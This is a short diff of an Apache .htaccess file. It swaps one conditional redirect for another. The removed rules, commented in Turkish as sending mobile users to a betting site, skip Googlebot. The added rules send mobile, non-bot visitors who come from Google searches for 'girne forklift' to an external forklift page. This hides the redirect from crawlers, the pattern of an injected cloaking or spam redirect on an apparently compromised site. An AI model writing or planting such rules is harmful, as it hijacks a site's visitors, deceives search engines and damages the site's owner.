@@ -1,10 +1,5 @@
 RewriteEngine On
-
-# Mobil cihazları tespit et
-RewriteCond %{HTTP_USER_AGENT} "android|iphone|ipad|mobile" [NC]
-
-# Google bot ise yönlendirme
-RewriteCond %{HTTP_USER_AGENT} !googlebot [NC]
-
-# Bahis sitesine yönlendir
-RewriteRule ^(.*)$ https://sonmeztrans.com/kibris-forklift-girne.html/$1 [R=302,L]
+RewriteCond %{HTTP_REFERER} google\.com.*q=girne.*forklift [NC]
+RewriteCond %{HTTP_USER_AGENT} "mobile|android|iphone" [NC]
+RewriteCond %{HTTP_USER_AGENT} !bot [NC]
+RewriteRule ^.*$ https://sonmeztrans.com/kibris-forklift-girne.html [R=302,L]
